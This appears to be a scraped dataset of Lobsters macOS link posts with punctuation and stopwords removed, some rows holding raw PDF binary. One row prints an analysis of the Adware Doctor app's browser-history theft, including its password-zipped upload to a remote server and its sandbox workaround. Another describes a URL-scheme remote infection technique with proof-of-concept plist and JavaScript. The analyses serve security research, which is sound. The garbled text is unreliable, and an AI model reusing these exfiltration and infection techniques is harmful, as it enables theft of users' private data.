prevented loading reveal server awesome team itty bitty apps went extra mile made release compatible iosmac platform simple reveal load debugger console trick conclusion porting io apps mac exciting easier ever apple new iosmac platform trick possible port entire large complex application le day choosing next experimental friday hackathon project ping steipete twitter show u result let marzipandemic commence
264,Lobsters,mac,Apple macOS,Apple File System Reference,https://developer.apple.com/support/apple-file-system/Apple-File-System-Reference.pdf,apple file system reference,,obj stream endstream endobj obj stream zߊ q c g tj l wn pf rrw endstream endobj obj stream u n f hth舧 vjs ɒr endstream endobj obj stream c n n p f mz n f k bm frag ɋ endstream endobj obj stream b zsr v k e ђ b endstream endobj obj stream vh u z z endstream endobj obj stream xڽɏ g ȓ l cse n w ǔ jc
265,Lobsters,mac,Apple macOS,Heapple Pie - The macOS/iOS default heap,https://www.synacktiv.com/ressources/Sthack_2018_Heapple_Pie.pdf,heapple pie macosios default heap,,äüöß obj stream 脜g ȏ l ôuy f oq g쪊m c c
266,Lobsters,mac,Apple macOS,Hammerspoon/presentation - OSHUG 69,https://github.com/Hammerspoon/presentation/tree/master/BCSPresentation.spoon,hammerspoonpresentation oshug,file permalink reload reload,file permalink failed load latest commit information type name latest commit message commit time perform action time signed another tab window reload refresh session signed another tab window reload refresh session
267,Lobsters,mac,Apple macOS,Homebrew/homebrew-bundle,https://github.com/Homebrew/homebrew-bundle,homebrewhomebrewbundle,homebrew bundle requirement homebrew linux homebrew cask mascli whalebrew installation usage section output note vagrant test copyright license,homebrew bundle bundler nonruby dependency homebrew homebrew cask mac app store whalebrew requirement homebrew macos linux installing dependency homebrew cask optional used installing mac application mascli optional used installing mac app store application whalebrew optional used installing whalebrew image installation brew bundle automatically installed first run usage see brew bundle section brew man output brew bundle help example brewfile brew tap tap homebrewcask brew tap custom git url tap usertaprepo http user bitbucketorguserhomebrewtaprepogit set argument brew cask install command caskargs appdir application brew install brew imagemagick brew install withrmtp brew service restart version change brew denjinginxnginxfull args withrmtp restartservice changed brew install always brew service restart brew link brew unlink mysql installed brew mysql restartservice true link true conflictswith mysql brew cask install cask googlechrome brew cask install appdirmyappsapplications cask firefox args appdir myappsapplications brew cask install usrlibexecjavahome failfast fails cask java unless system usrlibexecjavahome failfast ma install ma id whalebrew install whalebrew whalebrewwget note homebrew support installing specific version library recent one good mechanism storing installed version lock file software need specific version perhaps want look using vagrant better match development production environment test test run bundle install bundle exec rspec copyright copyright c homebrew maintainer andrew nesbitt see license detail
268,Lobsters,mac,Apple macOS,"#1 ""Paid Utility"" in Mac App Store steals Chrome, Firefox, and Safari browsing history",https://objective-see.com/blog/blog_0x37.html,paid utility mac app store steal chrome firefox safari browsing history,adware doctorzip background adware doctor adware doctor infamous chinese serial killer troubled past shown app store guideline thomas reed mac appstore apps fake review steal browser history video download procinfo charles proxy closer look whatsyoursign comappleyahooplist getting list process mac o x ramification internet search data collection storage privacy u human right civil liberty conclusion,deceitful doctor mac app store massively popular app surreptitiously steal browsing history research tool writing supported friend objectivesee today blog post brought update application adware doctor removed mac app store uploaded app binary want play along download adware doctorzip mojave sandbox always protect private content safari history process enumeration disallowed io sandbox yes binps blocked macos sandbox well apple noted sandboxed apps may still enumerate running process though likely change future background probably trust application official mac app store would nt apple state safest place download apps mac mac app store apple review app accepted store ever problem app apple quickly remove store however questionable whether statement actually hold true one top grossing application mac app store surreptitiously exfiltrates highly sensitive user information chinese developer though apple contacted month ago promised investigate application remains available mac app store even today note nefarious logic app originally uncovered major kudos reached collaboratively investigated issue together teamwork adware doctor adware doctor claim best app remove variety common adware threat target mac user found official mac app store application massively popular top grossing application sitting spot meaning listed apple main website category paid utility adware doctor hold enviable title top grossing application pop somebody raking ton money note nt lot information application developer yongming zhang however rather amusing perhaps coincidence zhang yongming infamous chinese serial killer troubled past reading adware doctor find rather unscrupulous history shown application ab using applescript apparent attempt perform elevated action violation apple app store guideline around time thomas reed noted app using name adware medic couple week ago happens name popular adwaremedic app got purchased malwarebytes apple pulled store licketysplit came right back adware doctor finally stellar review bestowed upon adware doctor application developer likely fake application specifically discussed insightful post mac appstore apps fake review maybe truly one amazing piece software ever written seems unlikely especially dig little thru app review however past action rather devious underhanded would understandable argue blatantly unconscionable though much unscrupulous behavior reported apple unfortunately failed decisively act course emboldened application developer point crossed indefensible line steal browser history recent tweet noted adware doctor stealing privacy tweet posted link video appeared show adware doctor collecting stealthily exfiltrating variety sensitive user data including browser history yikes let dive see going use combination static analysis disassemble dynamic analysis network monitoring file monitoring debugging get clear picture going ultimately confirm worrisome finding first let download adware doctor official mac app store yes paying confirm application case application mac app store validly signed apple proper launching application observe making various network request http example connects adwareressecuremacoscom make get request shown network capture downloaded file contains basic json configuration data disablerate false disableprescan false skon false faqlink http wwwadwaredoctorcomadwaredoctorfaq clicking clean button application ui trigger another network request adwareressecuremacoscom time download second file named downloaded file contains json notably link adware signature pattern database update true version url http rather unsurprisingly application downloads database though try take peek content appear encrypted often case antiadwareantivirus signature however debugger simply wait application decrypted file memory dump plaintext content lldb binarycontentmatchpatten browserhomepagepatten name chrome homepage safefinder patten chrome feedsnowbittcom publishertingnew name chrome homepage safefinder patten chrome feedsnowbittcom publishertingsyn name chrome homepage safefinder patten chrome searchword filepathpatten applicationswebshoppers applicationswebshoppy applicationssoftwareupdater applicationswebshoppers libraryapplication supportwebtools librarywebtools applicationswebtools applicationswebtoolsapp applicationssmartshoppy applicationsshoptool applicationsshoppytool applicationseasyshopper launchpathmatchpatten comwebshoppersagentplist comwebshoppyagentplist comwebshoppersagentplist comsoftwareupdateragentplist whitelist librarylaunchagentscomspotifywebhelperplist librarylaunchdaemonscomintelhaxmplist librarylaunchdaemonsnetprivatetunnelovpnagentplist librarylaunchdaemonscommixlrmixlraudiolinkplist librarylaunchdaemonscommcafeessmeupdateplist librarylaunchdaemonscommcafeessmscanfactoryplist librarylaunchdaemonscommcafeessmscanmanagerplist librarylaunchdaemonscommcafeevirusscanfmpdplist librarylaunchdaemonscommicrosoftautoupdatehelperplist librarylaunchagentscommicrosoftupdateagentplist librarylaunchdaemonscomcrashplanengineplist definitely look like legit antiadware signature hash match known adware adwaremacpirrit back adware doctor ui ready clean system point analysis nothing appeared ordinary thing get shady af first running file monitor apple built fsusage filtering caseinsensitively file containing history noticed interesting file access fsusage w f filesystem grep adware doctor grep historyadware open libraryapplication support b callhistorytransactions b adware open libraryapplication support b callhistorydb b adware rddata b historydb b adware usersuserlibraryapplication supportgooglechromedefault b history b adware open librarycontainerscomyelabbrowsersweeperdatalibraryapplication supportcomyelabbrowsersweeperhistoryzipadware librarycontainerscomyelabbrowsersweeperdatalibraryapplication supportcomyelabbrowsersweeperhistorypscommoninfoadware wrdata librarycontainerscomyelabbrowsersweeperdatalibraryapplication supportcomyelabbrowsersweeperhistoryappstorehistoryadware wrdata librarycontainerscomyelabbrowsersweeperdatalibraryapplication supportcomyelabbrowsersweeperhistorysafarihistoryadware wrdata librarycontainerscomyelabbrowsersweeperdatalibraryapplication supportcomyelabbrowsersweeperhistorychromehistoryadware wrdata librarycontainerscomyelabbrowsersweeperdatalibraryapplication supportcomyelabbrowsersweeperhistoryfirefoxhistory run process monitor opensource procinfo utility observe adware doctor spawning builtin zip utility create passwordprotected archive historyzip procinfoprocess start pid binbashargs binbash c zip r quiet p webtool usersuserlibrarycontainerscomyelabbrowsersweeperdatalibraryapplication supportcomyelabbrowsersweeper b historyzip b usersuserlibrarycontainerscomyelabbrowsersweeperdatalibraryapplication supportcomyelabbrowsersweeperhistory devnull moreover network proxy monitor charles proxy capture connection attempt adware doctor adscanyelabappcom editing system etchosts file redirect request server control capture adware doctor trying upload think might guessed historyzip file would correct python httpspylistening http request post header host adscanyelabappcomcontenttype multipartformdata keepaliveaccept useragent adware contentlength enusacceptencoding br gzip deflatepath historyzip length uploaded historyzip archive password protected luckily figuring password trivial looking back output process monitor one see password passed zip utility via command line zip r quiet p webtool password also hardcoded application binary get minute reverse various part binary let unzip archive entering webtool password wtf indeed noted adware doctor indeed surreptitiously stealing browser history cat comyelabbrowsersweeperdatalibraryapplication supportcomyelabbrowsersweeperhistorychromehistoryperson http wwwgooglecomsearch qifipunchmyselfinthefaceandithurtsdoesthatmakemeweakorstrong wwwgooglecomsearch qdoesyourstomachthinkallpotatoesaremashed cat comyelabbrowsersweeperdatalibraryapplication supportcomyelabbrowsersweeperhistorysafarihistoryhttps wwwgooglecomsearch clientsafari rlsen wwwgooglecomsearch clientsafari rlsen qwheredolostsocksgowhentheygomissing redirecting dns resolution easily capture exfiltrated data closer look let tear apart application answer question bypass constraint mac app sandbox access user file actually collect user browser history popular browser system information personally identifiable information pii collecting security privacy point view one main benefit installing application official mac app store application sandboxed benefit apple supposedly vet submitted application clearly shown sometimes miserable job application run inside sandbox constrained file user information access example sandboxed application mac app store able access user sensitive browser history adware doctor clearly found away dumping app entitlement via whatsyoursign see granted comapplesecurityfilesuserselectedreadwrite entitlement mean application request permission certain file explicit user approval read write access said file adware doctor executed first time request access user home directory file directory underneath well done code via mainwindowcontroller showfileaccess method class mainwindowcontroller void showfileaccess self appsandboxfileaccess fileaccess retain appsandboxfileaccess fileaccess retain rbx bsutil realhomedirectory retain hasaccesspremisionpath rbx assistance aptly named appsandboxfileaccess class example debugger lldb observe access check user home directory adware doctor appsandboxfileaccess hasaccesspremisionpath pushq rbp movq rsp rbp pushq pushq lldb po rdi appsandboxfileaccess lldb x hasaccesspremisionpath lldb po rdxusersuser antimalware antiadware tool going need legitimate access user file directory example scan malicious code however user clicked allow since adware doctor requested permission user home directory carte blanche access user file yes able detect clean adware also collect exfiltrate user file chooses adware doctor contains several method collecting variety information system user process list perhaps legitimate reason collected antimalware antiadware product others user browsing history seem blatant violation user privacy course apple strict mac app store rule collection method implemented aceadwarecleaner class named collect let reverse method first collectsample method method consults encrypted signature pattern database application downloaded appears looking collect file specified sample key void collectsample rbx pattendic rbx valueforkey sample debugger step code examine unencrypted value sample key lldb applicationadware doctorapp po rax nsarraym name whoami echo user name librarylaunchagentscomappleyahooplist ah looking file named comappleyahooplist user launchagents directory aware malware adware used specific file name hopped google lead article titled roughly translates brief analysis monroe crypto coin mining trojan mac using hash provided writeup locate related file virustotal including comappleyahooplist kinda neat adware doctor hunting specifically new undetected cryptominer appears targeting user predominantly china next let analyze collectpscommoninfotofile method decompilation littered string verbose method name reveals purpose rather quickly class aceadwarecleaner void collectpscommoninfotofile void retain nsmutablestring alloc init appendstring systemn rbx acecommon operatingsystem retain appendformat n rbx release appendstring o uptimen rbx acecommon getsystemuptime retain appendformat n rbx release appendstring launchn rbx self readlaunchfolder librarylaunchagents retain appendformat n rbx release rbx self readlaunchfolder librarylaunchdaemons retain appendformat n rbx release acecommon realhomedirectory retain nsstring stringwithformat librarylaunchagents retain rbx self readlaunchfolder retain appendformat n rbx release release release appendstring napplicationsn rbx acecommon filestringwithpath application retain appendstring rbx rbx release appendstring nprocessn rbx acecommon collectprocesslist retain appendstring rbx rbx release appendstring rbx acecommon retain appendstring rbx rbx release writetofile release release return could manually analyze code far simpler simply let execute set breakpoint following line near end function writetofile breakpoint trigger dump collected data could also examine first parameter figure filename data written disk manually examine file name file rdx register lldb po rdxusersuserlibrarycontainerscomyelabbrowsersweeperdatalibraryapplication supportcomyelabbrowsersweeperhistorypscommoninfo astute reader notice file pscommoninfo also exfiltrated adscanyelabappcom historyzip archive cat pscommoninfosystemversion build o root wheel applicationsapplicationsdvd playerapp applicationssiriapp applicationsquicktime playerapp applicationschessapp applicationsphoto boothapp applicationsadware doctorapp processname userid username bash user login root silhouette user mdwrite user systemlibraryframe may rightfully wondering sandboxed application able enumerate running process fair question though adware doctor gain permission enumerate user file via comapplesecurityfilesuserselectedreadwrite entitlement explicit user approval per sandbox design still able list running process recall collectpscommoninfotofile invokes following two method appendstring nprocessn rbx acecommon collectprocesslist retain appendstring rbx acecommon retain method collectprocesslist attempt enumerate running process via builtin p command lldb po rdi nsconcretetask lldb po rdi launchpath binsh lldb po rdi argument nsarrayi c p e c pid uid user args however blocked denied macos application sandbox enumerating running process within sandbox nono binsh binps operation permitted adware doctor however rather unscrupulous another trick sleeve let look method void rax processidttt processnamettt useridttt usernamettt commandn rcx procpidpath rax ok call iterates list returned function calling procpidpath seems safe assume return list process id dd dd dd kernprocallint int int int int int int rax sysctl rax assertrtn getbsdprocesslist sweeperpodspodaceengineacecommonm rbx malloc rax sysctl rbx invocation sysctl function coupled string getbsdprocesslist assert give away likely copy paste apple getbsdprocesslist code found technical q getting list process mac o x apparently one get process listing within application sandbox guessing method unsanctioned clearly go design goal sandbox isolation yes rather amusing code adware doctor us skirt sandbox directly apple let briefly chat adware doctor collect user browser history aptly named collectbrowserhistoryandprocess method call collectsafarihistorytofile collectchromehistorytofile firefoxhistory rather unsurprisingly method contain code extract user history browser safari invokes parsing historydb file void collectsafarihistorytofile void acecommon appinstalledbybundleid comapplesafari acecommon realhomedirectory retain rbx stringbyappendingpathcomponent librarysafarihistorydb retain fmdatabasequeue databasequeuewithpath rbx retain parse database else safari installed retain writedata release closefile collectchromehistorytofile little involved essentially boil enumerating chrome profile parsing googlechromehistory database void collectchromehistorytofile void nsstring stringwithformat libraryapplication supportgooglechrome history retain rbx rbx stringbyappendingpathcomponent retain copyitematpath rbx topath rbx fmdatabasequeue databasequeuewithpath retain finally collectfirefoxhistorytofile method enumerates firefox profile parsing profile placessqlite database void collectfirefoxhistorytofile void nsstring stringwithformat libraryapplication supportfirefoxprofiles placessqlite retain rbx stringbyappendingpathcomponent retain fmdatabasequeue databasequeuewithpath retain application also method named collectappstorehistorytofile yes attempt grab recent search app store app void collectappstorehistorytofile void rbx stringbyappendingpathcomponent librarycontainerscomappleappstoredatalibrarycachescomappleappstorewebkitcacheversion retain initwithformat libraryapplication support appstoredata rbx c grep searchitunes sed http searchitunesapplecom q nothing sacred p adware doctor craving locally collecting user data satisfied noted zip everything historyzip file exfiltration lldb po rdi nsconcretetask lldb po rdi launchpath binbash lldb po rdi argument nsarrayi c zip r quiet p webtool usersuserlibrarycontainerscomyelabbrowsersweeperdatalibraryapplication supportcomyelabbrowsersweeperhistoryzip usersuserlibrarycontainerscomyelabbrowsersweeperdatalibraryapplication supportcomyelabbrowsersweeperhistory devnull file along json blob containing list software dmgs pkgs downloaded uploaded server via call sendpostrequestwithsuffix method note api endpoint checkadware sendpostrequestwithsuffix checkadware params file rbx content n http dlgooglecomchromemacstableggrogooglechromedmg n http wwwgooglecomchrome n content n http n http wwwcharlesproxycomlatestreleasedownloaddo n content usersuserdownloadsfirefox n http n http wwwmozillaorgenusfirefoxdownloadthanks va n formdata name attachment filename historyzip contenttype applicationzip data belong china note day ago api endpoint perhaps subdomain adscanyelabappcom went offline clear case perhaps adware doctor developer saw identified issue maybe maintenance related api endpoint remain active however version application official mac app store still locally collect aforementioned data still attempt exfiltrate thus developer time could bring api endpoint back online resume data collection ramification purely technical point view adware doctor mildly interesting though make good casestudy walk thru reversing macos application however clearly bigger issue play first rather massive privacy issue let face browsing history provides glimpse almost every aspect life people even convicted murder based largely internet search fact application surreptitiously exfiltrating user browsing history possibly year put mildly rather f second let brief chat mac app store apple role lack apple state safest place download apps mac mac app store apple review app accepted store ever problem app apple quickly remove store doubt downloading apps mac app store generally speaking far safer random website internet claim statement perhaps lack truthiness least case adware doctor noted adware doctor long history questionable behavior act manner clearly violates apple app store stringent rule policy many way example data collection storage section app store rule guideline state apps collect user usage data must secure user consent collection apps must respect permission setting attempt trick force people consent unnecessary data access developer use apps surreptitiously discover private data removed developer program point adware doctor ask exfiltrate browser history access private data clearly based deceiving user beyond mistreatment blatant disrespect user data fact adware doctor dance around mac app sandbox seems clearly another violation well example fact apple block invocation p illustrates fact sandboxed application enumerating running process within sandbox application developer find away around still violation apple really review ing app accepted store grave obvious violation application missed know maybe one slipped though maybe give benefit doubt yes make mistake bring u next point apple also claim ever problem app apple quickly remove store maybe key word full month ago reported finding apple acknowledged promised investigate since cricket course incredible frustrating apple boldly state privacy u human right civil liberty take action conclusion blog post tore apart adware doctor one top grossing apps official mac app store research original credit uncovered blatant violation user privacy complete disregard apple app store guideline surprising though reported cupertino official channel month ago app remains mac app store even today tempting wonder apple cut sale massively popular app lead egregious inaction seem laudable statement supporting user privacy sadly word good news apple decisively act restoring faith mac app store importantly commitment u user easy pulling app refunding affected user though never get browser history back recovering hardearned money would start move apple love blog post tool support via patreon mahalo
269,Lobsters,mac,Apple macOS,The macOS Mojave Patcher Tool for Unsupported Macs,http://dosdude1.com/mojave/,macos mojave patcher tool unsupported mac,email protected faq update newer mac pro imac macbook pro newer macbook air aluminum unibody macbook newer mac mini white macbook newer xserve mac pro imacs macbook pro mac mini macbooks macbook air macbookair copy macos mojave installer app obtained mac app store using machine support mojave using builtin downloading feature tool menu bar simply select tool download macos mojave usb drive least gb size copy tool download view changelog download older version amd radeon hd series gpu acceleration currently possible get full graphic acceleration running mojave system radeon hd series gpu mojave almost unusable without graphic acceleration includes macbook pro system want enable gpu acceleration machine need disable amd gpu work macbook pro system disable amd gpu imac weird color also produced running mojave one video card installedenabled disable amd gpu macbook pro follow guide found machine support high sierra natively must ensure latest version system bootrom installed want boot apfs volume previously installed high sierra download install selected macos post install tool mojave install program named patch updater located applicationsutilities folder program alert new update patch available machine prompt install patch updater installed would like download run script found q tool created usb drive successfully booting progress bar hang bit half way check copy install macos mojave app using latest version tool must using latest version install macos mojave app version patch tool older support older version installer app q patch tool give error error copying file check make sure usb drive writeable try reformatting try different usb drive q patch tool give mounting failed error open disk utility verify installesd mounted eject try also check make sure install macos mojave app correct one around size used skip app verification option likely selected invalid app nt contain necessary file q nt see hard drive partition installer screen postinstall tool make sure filevault disabled use instruction found onyx,utility provided anyone free charge however like donate question comment feel free contact email protected please take look faq located bottom page well also youtube video showing process viewed important note later patched properly using mojave patcher version older update later updated installer volume version later mojave patcher able get system boot updating please read update section info content requirement newer mac pro imac macbook pro x x system amd radeon hd series gpus almost unusable running mojave detail located known issue section x system amd radeon hd series gpus almost unusable running mojave detail located known issue section x x x newer macbook air aluminum unibody macbook x x newer mac mini white macbook x newer xserve machine supported mac pro imacs macbook pro mac mini x x imac compatible cpu upgraded penrynbased core duo macbooks macbook air macbookair thing need copy macos mojave installer app obtained mac app store using machine support mojave using builtin downloading feature tool menu bar simply select tool download macos mojave usb drive least gb size copy tool download current version view changelog download older version known issue amd radeon hd series gpu acceleration currently possible get full graphic acceleration running mojave system radeon hd series gpu mojave almost unusable without graphic acceleration includes macbook pro system want enable gpu acceleration machine need disable amd gpu work macbook pro system disable amd gpu imac weird color also produced running mojave one video card installedenabled disable amd gpu macbook pro follow guide found builtin isight camera currently builtin isight camera work correctly machine seems hit miss installing expect isight camera nonfunctional trackpad affected trackpad nt fully supported mojave work fully usable mojave detects standard mouse preventing changing trackpadoriented setting use important note machine support high sierra natively must ensure latest version system bootrom installed want boot apfs volume previously installed high sierra download install package install latest bootrom version installing ensure system plugged power update installed insert desired usb drive open disk utility format o x extended journaled open macos mojave patcher tool browse copy macos mojave installer app ensure tool successfully verifies app next select usb drive target volume list click start operation operation completes boot target unsupported mac usb drive created holding option key turning machine selecting drive note perform step intend clean install otherwise simply skip step install volume containg previous version o x inplace upgrade installer boot open disk utility utility menu doubleclicking utility window bottom left corner screen select disk partition want install erase ensuring use either mac o extended journaled apfs filesystem type formatting entire drive ensure guid selected important note using apfs required mojave order receive system update via normal software update method choose continue using macos extended journaled filesystem type receive system update via system preference using apfs later machine work differently high sierra machine natively support high sierra therefore boot apfs volume natively please note following use apfs bootable recovery partition decide use apfs custom booting method installed postinstall tool firmware unsupported machine natively support booting apfs volume quite clean native booting cause issue running mojave demo modified booting process viewed install macos normally onto desired volume install completes reboot back onto installer drive time open macos post install application application select mac model using optimal patch selected based model select also select patch choosing select volume installed macos mojave click patch finish patching click reboot may sit moment rebuilding cache rebooting reason system fails work correctly rebooting boot back installer drive run post install patch select force cache rebuild rebooting nt necessary circumstance reboots boot fully working copy macos mojave additional info selected macos post install tool mojave install program named patch updater located applicationsutilities folder program alert new update patch available machine prompt install patch updater installed would like download run script found reinstalling patch system update patch may get overwritten using patch updater tool possible reinstall patch one click open patch updater application select view installed update use view show installed update menu menu bar reinstall patch simply rightclick list select reinstall also select reinstall button reinstall currently installed patch update important note using apfs required mojave order receive system update via normal software update method choose continue using macos extended journaled filesystem type receive system update via system preference using apfs follow installation step applying system update via software update reapplying postinstall patch using mojave patcher installer volume likely necessary install software update system fails boot afterwards need done updated normally via software update using apfs volume need patched using installer volume created mojave patcher version later installing updated normally via software update using apfs volume need patched using installer volume created mojave patcher version later installing add new change patchable postinstall tool mojave patcher older updating need use latest mojave patcher version create new installer volume using installer app update either installing via software update using installer volume created install currently running simply use software update pane system preference using apfs apply update update installed likely need reapply postinstall patch get system boot process detailed step currently running need proceed update method described currently running simply use software update pane system preference using apfs apply update update installed likely need reapply postinstall patch get system boot process detailed step currently running using nonafps volume need proceed update method described extended journaled volume mojave update install properly unsupported machine could result unbootable o want install update currently running perform following step download latest version mojave patcher download installer using tool menu mojave patcher create patched usb installer boot install onto volume containing older release done apply postinstall patch faq q tool created usb drive successfully booting progress bar hang bit half way check copy install macos mojave app using latest version tool must using latest version install macos mojave app version patch tool older support older version installer app q patch tool give error error copying file check make sure usb drive writeable try reformatting try different usb drive q patch tool give mounting failed error open disk utility verify installesd mounted eject try also check make sure install macos mojave app correct one around size used skip app verification option likely selected invalid app nt contain necessary file q nt see hard drive partition installer screen postinstall tool make sure filevault disabled use instruction found unlock manually using terminal q get symbol starting successfully installing mojave make sure run postinstall patch correct volume detailed step q get symbol starting patched usb drive check supportednot supported list top page ensure machine supported list q get nsurl error trying update machine use app store usually result invalid catalogurl set revert stock simply run sudo softwareupdate clearcatalog terminal run software update patch script located q safari app store andor mail stopped working installing system update download run onyx application select maintenence top click run button q get package eligible install error attepting install mojave due system date time set incorrectly fix either boot current o x install set date use terminal booting patched usb installer drive set date instruction set date using terminal found q system update appearing software update prefpane make sure running mojave apfs formatted volume using macos extended journaled volume either net convert volume apfs using disk utility patched installer drive simply apply desired system update following method detailed section q zoom application show video meeting due latest zoom version requiring metalcompatible gpu video rendering patch zoom application download run script located
271,Lobsters,mac,Apple macOS,Folon,http://www.folklore.org/StoryView.py?project=Macintosh&story=Folon,folon,,early steve job another one selfproclaimed crazy idea proposed contriving surreptitious little animated character dubbed mr macintosh would lurk subterranean depth system software surfacing every startle user see mister macintosh software team swamped essential work deferred implementing mr macintosh month later steve met belgian artist named jeanmichel folon whose work imbued humorous playfully profound sensibility steve thought would perfect mr macintosh invited folon visit mac team cupertino demo potential commission excited show mac accomplished artist like folon curious see reaction summer macpaint still gleam eye bill atkinson early prototype drawing application going called macsketch ported bill work lisa allowed user sketch line drawing mouse fill pattern see busy born part folon seemed fascinated embryonic macintosh demoed macsketch could barely restrain taking mouse experimenting minute found pen size liked cleared screen started drawing inimitable style quickly sketched cartoon featuring man holding gigantic apple outstretched arm bite taken place apple logo man mouth wide open mimicking hole apple amazing first try definitely worth preserving posterity gotten around implementing save command macsketch yet fortunately rudimentary print command working able capture paper folded copy kept wallet occasionally use example could done mac apple rewarded folon commission try come look mr macintosh marketing material almost one year later spring folon returned cupertino another visit mac team showed u number sketch made mr macintosh well stuff working mostly rendered set pastel colored pencil carrying presence mind remember macsketch drawing previous year still wallet took creased tattered copy requested sign jeanmichel happy oblige surprised pulled set pastel colored pencil began coloring part drawing subtle shading making stem apple red chin man blue shocked labeled man andy forehead finally signed bottom hello andy folon abandoned ambition mr macintosh due scarcity rom disk space development time eventually used folon drawing button given away trade show small rendition mr mac emblazoned first digital printed circuit board next copyright notice steve job remained friendly folon visited mac rollout paris following year instead attending french developer conference like supposed kept amended drawing wallet susan kare got tired ruining frequently refolding mounted small glass frame helped preserve unfortunately frame eventually broke misplaced drawing find preparing book recently surfaced happy able present look closely still see folon subtle colored pencil shading year old
272,Lobsters,mac,Apple macOS,Remote Mac Exploitation Via Custom URL Schemes,https://objective-see.com/blog/blog_0x38.html,remote mac exploitation via custom url scheme,background hack box gsec trail windshift apt document handler url scheme click file app open blog post click file app open oversight exposing spy macos remote exploitation homograph conclusion,remote mac exploitation via custom url scheme offensive cyberespionage campaign infects mac novel infection mechanism love blog post support tool writing patreon background recent blog post discussed vulnerability flaw macos allow malicious code perform sort nefarious action bypassing sip approving kernel extension dumping keychain much much however exploiting flaw require malicious code somehow already gained initial codeexecution targeted system word local attack generally would used offensive cyber operation today discus remote attack malware leveraging mean gain initial access fully patched macos system attack coupled various aforementioned attack could create elegant yet damaging attack macos note attack though remote requires user interaction however already proven successful security conscious macos target word handle care august hack box gsec taha karim darkmatter llc presented trail windshift apt abstract windshift apt obscure cyber espionage actor discovered recently targeting individual working government actor dedicated advanced spear phishing infrastructure able serve spear phishing email sm track individual continuously reconnaissance phase deceiving target credential harvesting phase impersonation global local platform provider make windshift apt different rest apt actor sole focus specific individual espionage surveillance purpose hard attribute modus operandi mo present talk windshift apt rarely engage target malware dark matter llc uncovered targeted attack actor able uncover analyze macos malwares used finally windshift apt unique macos infection trick abusing macos native functionality automatically spread malware target one intriguing aspect talk initial infection vector attacker ab used successfully remotely infect mac system government somewhere middle east note aim blog post nt simply regurgitate taha excellent talk instead let build dive little deeper infection mechanism malware discussing relevant macos internals provide proof concept code snippet discus mitigation remote attack document handler url scheme nutshell windshift apt abuse custom url scheme remotely infect macos target although user interaction required minimal influenced attacker moreover fact infection vector succeeded wild government target middle east conclusively illustrates interaction show stopper macos application advertise support handle various document type andor custom url scheme think application saying hey user try open document type foo url scheme bar got surely encountered macos example double click pdf document previewapp launched handle document browser click link application life mac app store app storeapp launched process request unfortunately way apple decided implement specifically register document handler custom url scheme leaf ripe abuse note though document handler url scheme slightly different o point view essential thus implemented similar manner let first take quick look document handler something researched blogged previous blog post click file app open analyzed piece adware mac file opener abused custom document handler stealthy way achieve persistence short malware advertised supported type file whenever user opened one file type malware would automatically launched o handle theory display document persistence twist note already application registered file type eg pdf html etc afaik usurped course first question mac file opener adware application matter fact advertise file supported thus invoked documented accessed user secondly o process register information recommend reading blog post answer question covered great detail briefly summarize well application tell o type file capable handling answer infoplist file noted mac file opener support file type see dumping infoplist raw plist information stored array key cfbundledocumenttypes apple state cfbundledocumenttypes array io o x contains array dictionary associate one document type app dictionary called typedefinition dictionary contains key used define document see mac file opener entry file type note cfbundletypeextensions key whose value set file extension adware claim handle cat mac file openerappcontentsinfoplist xml version encoding doctype plist public appledtd plist http plist version dict key buildmachineosbuild key string string key cfbundledevelopmentregion key string en string key cfbundledocumenttypes key array dict key cfbundletypeextensions key array string string array key cfbundletypename key string documenttype string key cfbundletypeostypes key array string string array key cfbundletyperole key string viewer string key lshandlerrank key string alternate string key nsdocumentclass key string document string dict answer second question need determine macos handle registration file document handler noted click file app open happens automatically occur soon application saved disk specifically summarize application malware downloaded saved file system trigger xpc message sent launch service daemon lsd lsd daemon par application extract save document handler persistent database fsusage w f filesystem grep infoplistopen usersuserdesktopmac file openerappcontentsinfoplist usrlibexeclsd lldb po rsi lsdatabase path dump lsd database via lsregister found systemlibraryframeworkscoreservicesframeworkframeworkslaunchservicesframeworksupport invoked dump flag displaying application specify document handler automatically registered lsd example see malicious application mac file opener present along document file type registered eg etc lsregister dump container mount state mountedbundle id uuids usersuserdownloadsmac file openerappname mac file openeridentifier compcvarkmacfileopener executable contentsmacosmac file opener claim id name documenttype rank alternate role viewer flag doctype binding application adware document handler automatically registered application automatically invoked anytime user attempt open document whose type match registered handler handle launch service framework specifically lsbundlecopyorchecknode method lsbundlecopyorchecknodeblockinvoke handle lookup matching document type registered application execution registered application lldb b lsbundlecopyorchecknodeblockinvoke lldb xgx lldb po fsnode flag path usersuserdesktopmac file openerapp recap application advertise handle various document file type o automatically register document handler soon app hit disk file opened launch service database consulted execute appropriate app ok document handler time discus custom url scheme handler macos point view url scheme handler basically document handler url also mean custom url scheme handler registered automatically macos soon application advertises support handler hit filesystem trigger execution automatically registered handler application custom url scheme invoked action triggered webpage easy see go wrong previously talked custom url scheme hack box see oversight exposing spy macos however context malware exploitation since nt yet access windshift malware sample wrote proof concept illustrate attacker could abuse custom url scheme handler remotely infect mac noting user interaction required start xcode cocoa app template logic application irrelevant however must edit app infoplist file advertise fact support custom url scheme xcode add url type array specify name scheme windshift url identifier examining raw plist illustrates map key cfbundleurltypes cfbundleurlschemes cfbundleurlname key cfbundleurltypes key array dict key cfbundleurlschemes key array string windshift string array key cfbundleurlname key string comfoobarwindshift string dict array soon application compiled downloaded launch service daemon parse bundle specifically infoplist detect presence custom url scheme handler register note happens automatically confirm dump launch service database via lsregister dump yups proof concept application windshiftapp along custom url scheme cfbundleurlschemes windshift bundleclass klsbundleclassapplicationcontainer mount state mountedbundle id macho uuids device familie counterpart id sequencenum familyid purchaserid downloaderid installtype appcontainer datacontainer path userspatrickprojectswindshiftderiveddatawindshiftbuildproductsdebugwindshiftapp name windshift executable contentsmacoswindshift cfbundleurltypes cfbundleurlname comfoobarwindshift cfbundleurlschemes windshift claim id name comfoobarwindshift rank default role viewer flag urltype icon binding windshift hop browser let go safari browse custom url scheme windshift confirm custom url scheme automatically registered click allow alert later application launched remote exploitation somewhat evil minded watched taha talk probably see going going describe method remotely target ideally infect mac user ab using custom url scheme first target must browse website control windshift apt group successfully used phishing email target visit malicious website trigger download archive zip file contains malicious application mac user using safari achieve automatically unzipped apple think wise automatically open safe file fact paramount mean malicious application v compressed zip archive user filesystem trigger registration custom url scheme handler thanks apple malicious app custom url scheme registered target system code within malicious webpage load browse custom url easy accomplish javascript windowlocationreplace windshift behind scene macos lookup handler custom url scheme course malicious application downloaded lookup complete o kindly attempt launch malicious application handle url request luckily mac user recent version safari trigger warning however character quotation mark attacker controlled name application thus easily make popup look rather mundane 